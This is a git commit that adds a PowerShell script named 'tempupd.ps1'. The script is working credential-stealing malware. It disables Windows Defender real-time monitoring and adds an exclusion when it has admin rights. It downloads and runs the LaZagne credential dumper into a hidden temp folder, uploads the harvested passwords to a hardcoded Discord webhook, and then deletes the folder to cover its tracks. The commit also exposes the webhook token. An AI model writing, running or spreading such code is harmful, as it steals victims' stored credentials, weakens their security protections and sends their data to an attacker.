29f963a33e4cd460a083a5778323b62027167ee8
bindas88 <63970413+bindas88@users.noreply.github.com>
2024-08-03 10:54:47 +0700

    Add files via upload

---
+++ tempupd.ps1
@@ -0,0 +1,27 @@
+$webhook = "https://discord.com/api/webhooks/1168586821467381820/h-MBHVPPWdCK3gsFubvUyitgQDscQ7X7mzt56tEpOYO1didWgmdUZYJM3tN77MTNAcdC";
+$IsAdmin = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
+$Admin = $IsAdmin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$dir = "$env:temp\JHknfuiD"
+if (!(Test-Path -Path "$dir")) {
+New-Item -ItemType Directory -Path "$dir"
+}
+if (-not $version) {
+  $version = "2.4.6"
+}
+$log = "$dir\$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+$verm = "v$version"
+$zelda = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.6/LaZagne.exe"
+if ($Admin -eq 'True') {
+  Set-MpPreference -DisableRealtimeMonitoring $true
+
+  Add-MpPreference -ExclusionPath "$dir"
+}
+$hide = Get-Item "$dir" -Force
+$hide.attributes='Hidden'
+Invoke-WebRequest -Uri "$zelda" -OutFile "$dir\lazagne.exe"
+& "$dir\lazagne.exe" all -vv > "$log"
+curl.exe -F "payload_json={\`"username\`": \`"$env:ComputerName\`", \`"content\`": \`"New File Uploaded`!\n(Admin: $Admin) \`"}" -F "file=@\`"$log\`"" $webhook >$null 2>&1
+Start-Sleep -Seconds 20
+$unhide = Get-Item "$dir" -Force
+$unhide.attributes='Normal'
+Remove-Item -Path "$dir" -Recurse -Force
